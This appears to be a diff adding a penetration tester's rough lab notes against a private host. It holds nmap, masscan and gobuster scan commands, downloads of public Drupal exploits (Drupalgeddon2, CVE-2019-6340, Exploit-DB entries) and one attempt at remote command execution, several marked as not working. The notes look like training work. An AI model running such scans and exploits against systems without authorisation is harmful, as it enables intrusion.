@@ -1,0 +1,23 @@
+nmap -sTVC 10.11.1.50 -Pn > nmap.txt
+nmap -sTVC 10.11.1.50 -p- > nmapall.txt
+
+nmap masscan -e tun0 -p0-65535 --max-rate 500 10.11.1.50 > nmapall.txt
+
+gobuster dir  -u http://10.11.1.50/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+
+
+download CVE-2018-7600 https://github.com/dreadlocked/Drupalgeddon2.git
+not work ./drupalgeddon2.rb http://localhost/
+
+download 2019-6340  https://www.exploit-db.com/download/46459
+not work python3 2019-6340.py  http://10.11.1.50/ "ps auxf"
+
+searchexploit find 34992   not work
+
+
+gobuster dir  -u http://10.11.1.50:9505/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster9505.txt
+
+http://10.11.1.50:9505/
+
+
+download  https://www.exploit-db.com/download/39161
